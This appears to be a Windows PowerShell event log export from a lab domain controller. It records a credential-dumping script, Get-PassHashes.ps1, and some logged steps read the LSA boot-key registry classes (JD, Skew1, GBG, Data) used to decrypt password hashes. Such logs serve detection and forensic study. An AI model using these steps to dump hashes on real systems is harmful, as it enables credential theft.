        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 90
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.479021200Z" />
    <EventRecordID>14226</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-5e3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 90
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="byte[]"
ParameterBinding(New-Object): name="ArgumentList"; value="16"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Process"; value="$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)"
ParameterBinding(ForEach-Object): name="InputObject"; value="0"
ParameterBinding(ForEach-Object): name="InputObject"; value="1"
ParameterBinding(ForEach-Object): name="InputObject"; value="2"
ParameterBinding(ForEach-Object): name="InputObject"; value="3"
ParameterBinding(ForEach-Object): name="InputObject"; value="4"
ParameterBinding(ForEach-Object): name="InputObject"; value="5"
ParameterBinding(ForEach-Object): name="InputObject"; value="6"
ParameterBinding(ForEach-Object): name="InputObject"; value="7"
ParameterBinding(ForEach-Object): name="InputObject"; value="8"
ParameterBinding(ForEach-Object): name="InputObject"; value="9"
ParameterBinding(ForEach-Object): name="InputObject"; value="10"
ParameterBinding(ForEach-Object): name="InputObject"; value="11"
ParameterBinding(ForEach-Object): name="InputObject"; value="12"
ParameterBinding(ForEach-Object): name="InputObject"; value="13"
ParameterBinding(ForEach-Object): name="InputObject"; value="14"
ParameterBinding(ForEach-Object): name="InputObject"; value="15"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = ForEach-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 88
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.478765500Z" />
    <EventRecordID>14225</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-c93a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = ForEach-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 88
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Process"; value="$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)"
ParameterBinding(ForEach-Object): name="InputObject"; value="0"
ParameterBinding(ForEach-Object): name="InputObject"; value="1"
ParameterBinding(ForEach-Object): name="InputObject"; value="2"
ParameterBinding(ForEach-Object): name="InputObject"; value="3"
ParameterBinding(ForEach-Object): name="InputObject"; value="4"
ParameterBinding(ForEach-Object): name="InputObject"; value="5"
ParameterBinding(ForEach-Object): name="InputObject"; value="6"
ParameterBinding(ForEach-Object): name="InputObject"; value="7"
ParameterBinding(ForEach-Object): name="InputObject"; value="8"
ParameterBinding(ForEach-Object): name="InputObject"; value="9"
ParameterBinding(ForEach-Object): name="InputObject"; value="10"
ParameterBinding(ForEach-Object): name="InputObject"; value="11"
ParameterBinding(ForEach-Object): name="InputObject"; value="12"
ParameterBinding(ForEach-Object): name="InputObject"; value="13"
ParameterBinding(ForEach-Object): name="InputObject"; value="14"
ParameterBinding(ForEach-Object): name="InputObject"; value="15"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="byte[]"
ParameterBinding(New-Object): name="ArgumentList"; value="16"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 86
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.467137900Z" />
    <EventRecordID>14224</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-5d3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 86
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="byte[]"
ParameterBinding(New-Object): name="ArgumentList"; value="16"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Process"; value="Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_""
ParameterBinding(ForEach-Object): name="InputObject"; value="JD"
ParameterBinding(ForEach-Object): name="InputObject"; value="Skew1"
ParameterBinding(ForEach-Object): name="InputObject"; value="GBG"
ParameterBinding(ForEach-Object): name="InputObject"; value="Data"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = ForEach-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 84
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.462581800Z" />
    <EventRecordID>14223</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-503b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = ForEach-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 84
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Process"; value="Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_""
ParameterBinding(ForEach-Object): name="InputObject"; value="JD"
ParameterBinding(ForEach-Object): name="InputObject"; value="Skew1"
ParameterBinding(ForEach-Object): name="InputObject"; value="GBG"
ParameterBinding(ForEach-Object): name="InputObject"; value="Data"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Out-Null): "Out-Null"
ParameterBinding(Out-Null): name="InputObject"; value="0"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Out-Null
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 82
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.462482300Z" />
    <EventRecordID>14222</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-5c3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Out-Null
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 82
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Out-Null): "Out-Null"
ParameterBinding(Out-Null): name="InputObject"; value="0"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Text.Stringbuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="1024"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 80
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.462313900Z" />
    <EventRecordID>14221</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-5b3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 80
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Text.Stringbuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="1024"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Out-Null): "Out-Null"
ParameterBinding(Out-Null): name="InputObject"; value="0"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Out-Null
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 78
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.462014000Z" />
    <EventRecordID>14220</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-593b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Out-Null
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 78
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Out-Null): "Out-Null"
ParameterBinding(Out-Null): name="InputObject"; value="0"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Text.Stringbuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="1024"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 76
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.461845100Z" />
    <EventRecordID>14219</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-583b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 76
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Text.Stringbuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="1024"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Out-Null): "Out-Null"
ParameterBinding(Out-Null): name="InputObject"; value="0"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Out-Null
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 74
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.461480800Z" />
    <EventRecordID>14218</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-563b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Out-Null
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 74
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Out-Null): "Out-Null"
ParameterBinding(Out-Null): name="InputObject"; value="0"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Text.Stringbuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="1024"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 72
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.461298700Z" />
    <EventRecordID>14217</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-553b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 72
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Text.Stringbuilder"
ParameterBinding(New-Object): name="ArgumentList"; value="1024"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Out-Null): "Out-Null"
ParameterBinding(Out-Null): name="InputObject"; value="0"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
